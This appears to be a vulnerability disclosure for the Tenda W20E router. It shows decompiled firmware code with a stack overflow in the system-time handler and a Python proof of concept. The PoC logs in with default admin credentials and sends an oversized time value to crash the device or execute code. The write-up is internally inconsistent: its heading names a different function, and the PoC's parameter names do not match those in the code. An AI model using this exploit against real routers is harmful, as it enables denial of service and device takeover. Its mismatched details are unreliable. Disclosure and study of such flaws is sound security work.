# Tenda W20E

### version

```
V15.11.0.6 （US_W20EV4.0br_V15.11.0.6（1068_1546_841）_CN_TDC）
```

### Firmware

```
https://www.tenda.com.cn/download/detail-2707.html
```



## setStaticRoute

### detail

In function formSetSysTime,the content obtained by the program from the parameter "manualTime" is passed to manual_time.Then the manual_time is directly copied into the year stack through the sscanf function.There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.

```c
void __cdecl formSetSysTime(webs_t wp, char_t *path, char_t *query)
{
  int v3; // r0
  int v4; // r0
  tm tm_t; // [sp+20h] [bp-8Ch] BYREF
  timeval tv; // [sp+4Ch] [bp-60h] BYREF
  unsigned __int8 sec[8]; // [sp+54h] [bp-58h] BYREF
  unsigned __int8 min[8]; // [sp+5Ch] [bp-50h] BYREF
  unsigned __int8 hour[8]; // [sp+64h] [bp-48h] BYREF
  unsigned __int8 day[8]; // [sp+6Ch] [bp-40h] BYREF
  unsigned __int8 month[8]; // [sp+74h] [bp-38h] BYREF
  unsigned __int8 year[8]; // [sp+7Ch] [bp-30h] BYREF
  unsigned __int8 par[16]; // [sp+84h] [bp-28h] BYREF
  time_t timep; // [sp+94h] [bp-18h]
  unsigned __int8 *manual_time; // [sp+98h] [bp-14h]
  unsigned __int8 *timeper; // [sp+9Ch] [bp-10h]
  unsigned __int8 *timezone; // [sp+A0h] [bp-Ch]
  unsigned __int8 *mode; // [sp+A4h] [bp-8h]

  *(_DWORD *)par = 0;
  *(_DWORD *)&par[4] = 0;
  *(_DWORD *)&par[8] = 0;
  *(_DWORD *)&par[12] = 0;
  mode = websGetVar(wp, "sysTimePolicy", byte_EA7E0);
  if ( !strcmp((const char *)mode, "syncNet") )
  {
    timezone = websGetVar(wp, "timeZone", byte_EA7E0);
    timeper = websGetVar(wp, "syncTimeCycle", byte_EA7E0);
    SetValue("sys.timesyn", "1");
    SetValue("sys.timezone", timezone);
    v3 = SetValue("sys.timefixper", timeper);
    if ( CommitCfm(v3) )
    {
      sprintf((char *)par, "op=%d", 3);
      send_msg_to_netctrl(24, par);
    }
  }
  else if ( !strcmp((const char *)mode, "manual") )
  {
    *(_DWORD *)year = 0;
    *(_DWORD *)&year[4] = 0;
    *(_DWORD *)month = 0;
    *(_DWORD *)&month[4] = 0;
    *(_DWORD *)day = 0;
    *(_DWORD *)&day[4] = 0;
    *(_DWORD *)hour = 0;
    *(_DWORD *)&hour[4] = 0;
    *(_DWORD *)min = 0;
    *(_DWORD *)&min[4] = 0;
    *(_DWORD *)sec = 0;
    *(_DWORD *)&sec[4] = 0;
    manual_time = websGetVar(wp, "manualTime", byte_EA7E0);
    sscanf((const char *)manual_time, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s", year, month, day, hour, min, sec);
    tm_t.tm_year = atoi((const char *)year) - 1900;
    tm_t.tm_mon = atoi((const char *)month) - 1;
    tm_t.tm_mday = atoi((const char *)day);
    tm_t.tm_hour = atoi((const char *)hour);
    tm_t.tm_min = atoi((const char *)min);
    tm_t.tm_sec = atoi((const char *)sec);
    timep = mktime(&tm_t);
    if ( timep > 10 )
    {
      tv.tv_sec = timep;
      tv.tv_usec = 0;
      if ( settimeofday(&tv, 0) >= 0 )
      {
        v4 = SetValue("sys.timesyn", "0");
        if ( CommitCfm(v4) )
        {
          sprintf((char *)par, "op=%d", 2);
          send_msg_to_netctrl(24, par);
        }
      }
    }
  }
  outputToWebs(wp, "1");
```



### poc

```python
import requests

cmd  = b'timeType =' + b'manual' 
cmd += b'&time =' + b'2022-01-01' +b'A' * 500



url = b"http://192.168.0.1/login/Auth"
payload = b"http://192.168.0.1/goform/setSysTime/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

